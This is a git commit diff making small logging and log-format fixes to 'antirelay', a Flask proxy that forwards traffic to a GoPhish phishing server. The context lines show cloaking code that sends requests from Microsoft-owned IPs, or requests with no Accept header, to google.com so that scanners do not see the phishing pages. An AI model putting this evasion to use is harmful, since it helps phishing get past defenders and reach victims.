bdba2160cd6459322ecb77fbbad9d0adf5626039
a5ucanc <itaycheredman@gmail.com>
2024-05-16 16:10:54 +0300

    bugfix

--- antirelay/antirelay/app.py
+++ antirelay/antirelay/app.py
@@ -5,7 +5,6 @@ Author: Nimrod (Nimi) Bickels
 """
 from flask import Flask, request, redirect, Response
 from ipwhois import IPWhois
-import logging
 import requests
 
 def is_microsoft_ans(ip):
@@ -21,7 +20,7 @@ def crawler(fn):
     def wrapper(*args, **kwargs):
         client_ip = request.headers.get('X-Forwarded-For', '').split(',')[0] or request.remote_addr
         if is_microsoft_ans(client_ip) or not request.headers.get('Accept', ''):
-            logging.info(f"REDIRECTED")
+            app.logger.info(f"REDIRECTED")
             return redirect('https://google.com')
         return fn(*args, **kwargs)
     return wrapper
@@ -47,7 +46,7 @@ def redirect_to_gophish(path):
         cookies         = request.cookies,
         allow_redirects = False,
     )
-    logging.info(f'FORWARD - "{request.method} {query_string} {data}" to gophish/{path} - {len(res.content)}')
+    app.logger.info(f'FORWARD - "{request.method} {query_string} {data}" to gophish/{path} - {len(res.content)}')
     headers = [(k,v) for k,v in res.raw.headers.items()]
 
     response = Response(res.content, res.status_code, headers)
--- antirelay/antirelay/gunicorn.conf.py
+++ antirelay/antirelay/gunicorn.conf.py
@@ -2,6 +2,6 @@ import multiprocessing
 
 bind = "0.0.0.0:80"
 workers = multiprocessing.cpu_count() * 2 + 1
-access_log_format = '%({x-forwarded-for}i)s %(l)s %(l)s [%(t)s] "%(r)s" %(s)s %(b)s %(a)s'
+access_log_format = '%({x-forwarded-for}i)s %(l)s %(l)s %(t)s "%(r)s" %(s)s %(b)s %(a)s'
 accesslog = "-"
 errorlog = "-"
